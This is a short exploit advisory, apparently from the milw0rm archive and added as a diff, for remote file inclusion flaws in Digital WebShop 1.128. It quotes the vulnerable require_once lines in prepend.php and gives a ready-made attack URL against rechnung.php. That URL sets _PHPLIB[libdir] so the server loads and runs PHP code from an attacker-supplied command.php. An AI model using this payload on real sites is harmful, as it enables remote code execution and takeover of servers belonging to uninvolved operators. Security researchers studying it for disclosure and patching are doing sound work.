@@ -1,0 +1,35 @@
+# Title  :  Digital WebShop = v1.128 Multiple Remote File Include Vulnerabilities
+# Author :   ajann
+# Script Page : http://digitalwebshop.dyndns.org
+
+# Exploit;
+*******************************************************************************
+[Files]
+rechnung.php
+prepend.php
+[/Files]
+
+[Code,1]
+prepend.php Error:
+
+// include Werzeuge
+..
+....
+require_once($_PHPLIB["libdir"] . "phpDB-mysql.lib");                   /*
+Mysql Class*/
+require_once($_PHPLIB["libdir"] . "messages_inc.php");                  /*
+Layout f?r Echos & Prints. */
+....
+..
+
+Key [:] _PHPLIB[libdir]=http://target.com/command.php?
+
+\Example:
+
+http://target.com/rechnung.php?_PHPLIB[libdir]=http://target.com/command.php?
+
+# ajann,Turkey
+# ...
+# Im not Hacker!
+
+# milw0rm.com [2006-09-19]
